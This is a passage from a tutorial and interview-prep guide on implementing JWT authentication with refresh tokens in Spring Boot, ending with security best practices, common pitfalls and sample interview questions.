**JWT Utility Methods**:

#### a) Generate Token
- Input: User details (username, roles)
- Create claims (subject, issued at, expiration, custom claims)
- Sign the JWT using secret key and algorithm (e.g., HS256)
- Return the JWT string

#### b) Extract Claims
- Input: JWT string
- Parse the JWT
- Extract specific claims (username, expiration, roles)

#### c) Validate Token
- Input: JWT string and UserDetails
- Extract username from token
- Check if username matches
- Check if token is not expired
- Return boolean (valid or not)

#### d) Check Expiration
- Extract expiration date from token
- Compare with current date
- Return boolean (expired or not)

**Configuration**:
- Store secret key in `application.properties` (environment variable in production)
- Define token validity duration (e.g., 15 minutes for access token)

**Example Configuration**:
```properties
jwt.secret=YourSuperSecretKeyAtLeast256BitsLong
jwt.expiration=900000  # 15 minutes in milliseconds
```

### Step 5: Create Authentication Controller

Create a REST controller to handle user login and registration.

**Endpoints**:

#### a) POST /auth/login
- **Request**: JSON with username and password
- **Process**:
  - Validate credentials using Spring Security's AuthenticationManager
  - If valid, generate JWT using JWT Utility
  - Return JWT in response
- **Response**: JSON with JWT token (and optionally refresh token)

#### b) POST /auth/register (Optional)
- **Request**: JSON with username, password, email
- **Process**:
  - Validate input
  - Hash password using BCryptPasswordEncoder
  - Save user to database
  - Return success message
- **Response**: Success or error message

**Request and Response DTOs**:
- **Login Request**: Username and password
- **Authentication Response**: JWT token
- **Register Request**: User details

### Step 6: Create JWT Authentication Filter

This is the heart of JWT validation. It's a filter that intercepts every incoming request.

**Filter Purpose**: Extract and validate JWT from request headers, then set authentication in Spring Security context.

**Filter Process**:

#### 1. Extract JWT from Request
- Check if request has `Authorization` header
- Extract token from header (format: `Bearer <token>`)
- If no token, allow request to proceed (might be public endpoint)

#### 2. Validate JWT
- Use JWT Utility to extract username from token
- Check if username exists
- Load user details using UserDetailsService
- Validate token using JWT Utility (signature, expiration, username match)

#### 3. Set Authentication
- If token is valid:
  - Create Authentication object with user details and authorities
  - Set authentication in Spring Security's SecurityContext
  - This tells Spring Security that the user is authenticated

#### 4. Continue Filter Chain
- Pass request to next filter
- Eventually reaches your controller endpoint

**Filter Configuration**:
- Extend Spring Security's `OncePerRequestFilter` (ensures filter runs once per request)
- Override `doFilterInternal` method
- Inject JWT Utility and UserDetailsService

### Step 7: Configure Spring Security

Configure Spring Security to use JWT authentication.

**Security Configuration Class**:
- Annotate with `@EnableWebSecurity`
- Extend `WebSecurityConfigurerAdapter` or use new functional approach

**Configuration Steps**:

#### a) Disable Session Management
- JWT is stateless, so disable session creation
- Set session creation policy to STATELESS

#### b) Configure Authentication Manager
- Provide UserDetailsService implementation
- Provide PasswordEncoder (BCryptPasswordEncoder)

#### c) Define Public and Protected Endpoints
- Public endpoints: `/auth/login`, `/auth/register` (no authentication required)
- Protected endpoints: All others (require valid JWT)

#### d) Add JWT Filter
- Register your JWT Authentication Filter
- Add it before Spring Security's UsernamePasswordAuthenticationFilter

#### e) Disable CSRF (Optional)
- Since JWT in headers doesn't use cookies, CSRF protection may not be needed
- Be cautious: only disable if not using cookie-based JWT

#### f) Configure CORS (if needed)
- Allow cross-origin requests from your frontend
- Configure allowed origins, methods, headers

**Conceptual Configuration**:
```
SecurityConfiguration:
  - Disable session (stateless)
  - Disable CSRF (if using header-based JWT)
  - Define public endpoints: /auth/**
  - Define protected endpoints: /api/**
  - Add JWT filter before authentication filter
  - Set authentication manager with UserDetailsService
  - Set password encoder to BCrypt
```

### Step 8: Protect Your API Endpoints

Now your API endpoints are protected.

**Controller Example**:
- Create REST controller for your business logic
- Define endpoints (e.g., `/api/users`, `/api/products`)
- Spring Security automatically protects them
- If request has valid JWT, it proceeds
- If no JWT or invalid JWT, returns 401 Unauthorized

**Authorization by Role**:
- Use annotations like `@PreAuthorize("hasRole('ADMIN')")`
- Restrict endpoints to specific roles
- Spring Security checks user's authorities from JWT

### Step 9: Implement Refresh Token (Optional but Recommended)

For better security and UX, implement refresh tokens.

**Additional Components**:

#### a) Refresh Token Entity and Repository
- Store refresh tokens in database
- Fields: token ID, user ID, token string, expiration date

#### b) Generate Refresh Token
- When user logs in, generate both access token and refresh token
- Store refresh token in database
- Return both tokens to client

#### c) Refresh Token Endpoint
- **POST /auth/refresh**
- **Request**: Refresh token (from cookie or body)
- **Process**:
  - Validate refresh token
  - Check if it exists in database and not expired
  - Generate new access token (and optionally new refresh token)
  - Return new tokens
- **Response**: New access token

#### d) Refresh Token Rotation (Advanced)
- When refresh token is used, invalidate it
- Issue a new refresh token
- Store new refresh token in database

### Step 10: Error Handling

Implement proper error handling for authentication failures.

**Custom Exception Handler**:
- Handle JWT parsing exceptions
- Handle expired token exceptions
- Handle invalid signature exceptions
- Return appropriate HTTP status codes and error messages

**Status Codes**:
- **401 Unauthorized**: Invalid or missing JWT
- **403 Forbidden**: Valid JWT but insufficient permissions
- **400 Bad Request**: Malformed JWT

### Step 11: Testing the Flow

**Test the Complete Flow**:

1. **Register a User**:
   - POST `/auth/register` with username and password
   - User saved to database with hashed password

2. **Login**:
   - POST `/auth/login` with username and password
   - Receive access token (and refresh token)

3. **Access Protected Endpoint**:
   - GET `/api/users` with `Authorization: Bearer <access_token>` header
   - If valid, receive data
   - If invalid, receive 401 error

4. **Access Without Token**:
   - GET `/api/users` without Authorization header
   - Receive 401 Unauthorized

5. **Access with Expired Token**:
   - Wait for token to expire
   - GET `/api/users` with expired token
   - Receive 401 Unauthorized with "token expired" message

6. **Refresh Access Token**:
   - POST `/auth/refresh` with refresh token
   - Receive new access token
   - Use new token to access protected endpoint

### Component Summary

| Component | Purpose |
|-----------|---------|
| **User Entity** | Database model for users |
| **User Repository** | Database queries for users |
| **UserDetailsService** | Load user details for Spring Security |
| **JWT Utility** | Generate, parse, validate JWTs |
| **Authentication Controller** | Handle login, register, refresh endpoints |
| **JWT Authentication Filter** | Intercept requests, validate JWT, set authentication |
| **Security Configuration** | Configure Spring Security with JWT |
| **Protected Controllers** | Your business logic APIs |
| **Password Encoder** | Hash passwords (BCrypt) |
| **Exception Handler** | Handle authentication errors |

### Configuration Files

**application.properties / application.yml**:
```properties
# JWT Configuration
jwt.secret=your-secret-key-at-least-256-bits
jwt.expiration=900000  # 15 minutes
jwt.refresh-expiration=604800000  # 7 days

# Database Configuration
spring.datasource.url=jdbc:mysql://localhost:3306/mydb
spring.datasource.username=root
spring.datasource.password=password

# JPA Configuration
spring.jpa.hibernate.ddl-auto=update
spring.jpa.show-sql=true
```

### Security Best Practices for Spring Boot JWT

1. **Store Secret in Environment Variables**: Never hardcode secret key in code
2. **Use BCrypt for Passwords**: Always hash passwords, never plain text
3. **Validate Input**: Sanitize all user inputs in registration and login
4. **Use HTTPS**: Force HTTPS in production
5. **Implement Rate Limiting**: Prevent brute force attacks on login endpoint
6. **Log Authentication Events**: Log failed login attempts
7. **Use Strong Secret Key**: Minimum 256 bits for HS256
8. **Short Access Token Expiry**: 15-30 minutes
9. **Implement Refresh Tokens**: For better UX and security
10. **Regular Security Updates**: Keep Spring Security and JWT libraries updated

### Common Pitfalls to Avoid

1. **Not validating token signature**: Always verify before trusting
2. **Accepting any algorithm**: Explicitly enforce expected algorithm
3. **Not checking expiration**: Always validate `exp` claim
4. **Storing secret in code**: Use environment variables
5. **Using weak secrets**: Use strong random keys
6. **Not handling token refresh**: Users get logged out every 15 minutes
7. **Forgetting CORS**: Frontend can't call your API
8. **Not disabling session**: Spring creates sessions even with JWT
9. **Exposing detailed error messages**: Attackers can exploit information leakage
10. **Not implementing rate limiting**: Vulnerable to brute force attacks

---

## Summary and Key Takeaways

### JWT in a Nutshell
- **Format**: `header.payload.signature` (Base64 encoded)
- **Stateless**: Server doesn't store tokens
- **Signed**: Ensures integrity and authenticity
- **Self-contained**: Carries user information in payload

### Authentication Evolution
- **Old**: Session-based (stateful, server-side storage)
- **New**: JWT (stateless, client-side storage)
- **Reason**: Scalability, performance, modern architecture

### JWT vs Sessions
- **JWT**: Stateless, scalable, harder to revoke
- **Sessions**: Stateful, easier revocation, harder to scale

### Security Strategy
- **Short-lived access tokens** (15 min)
- **Long-lived refresh tokens** (7 days)
- **Token rotation** for enhanced security

### OAuth2 and OIDC
- **OAuth2**: Authorization framework (what you can access)
- **OIDC**: Authentication protocol (who you are)
- **Both use JWT** for tokens

### Okta and IdPs
- **Identity Providers** like Okta handle authentication
- They implement OAuth2 and OIDC
- They issue JWTs for your apps to validate
- Reduces complexity and improves security

### Spring Boot JWT Flow
1. User logs in → Server validates → Generates JWT
2. Client stores JWT → Includes in requests
3. Filter extracts JWT → Validates → Sets authentication
4. Controller processes request

### Security Essentials
- Always use HTTPS
- Store tokens securely (HTTP-only cookies)
- Validate signature and expiration
- Never put sensitive data in payload
- Use strong secret keys
- Implement refresh token strategy

---

## Interview Tips

### Questions You Might Be Asked

1. **"What is JWT and how does it work?"**
   - Explain structure, stateless nature, and authentication flow

2. **"What's the difference between JWT and session authentication?"**
   - Focus on stateful vs stateless, scalability, revocation

3. **"How do you handle JWT expiration?"**
   - Explain access token + refresh token strategy

4. **"What are the security concerns with JWT?"**
   - Discuss XSS, storage, revocation, payload exposure

5. **"Where do you store JWT on the client?"**
   - Compare localStorage vs HTTP-only cookies, mention trade-offs

6. **"Can you revoke a JWT?"**
   - Explain the challenge and solutions (short expiry, blacklists)

7. **"What's the difference between OAuth2 and JWT?"**
   - OAuth2 is a protocol, JWT is a token format

8. **"How does Okta work with JWT?"**
   - Okta as IdP, issues JWTs, your app validates them

9. **"How would you implement JWT in Spring Boot?"**
   - Walk through components: filter, utility, configuration

10. **"What claims should be in a JWT?"**
    - User ID, expiration, issuer, audience; never passwords

### What to Emphasize

- **Scalability**: JWT's stateless nature enables horizontal scaling
- **Performance**: No database lookups for authentication
- **Security trade-offs**: Understand revocation challenges
- **Modern architecture**: Perfect for microservices and APIs
- **Refresh tokens**: Show you understand production-ready implementations

### Red Flags to Avoid

- Saying JWT is always better than sessions (context-dependent)
- Not mentioning security concerns (shows lack of depth)
- Confusing OAuth2 with JWT
- Ignoring token expiration and refresh strategy
- Not understanding the stateless nature

---

**Good luck with your interview!**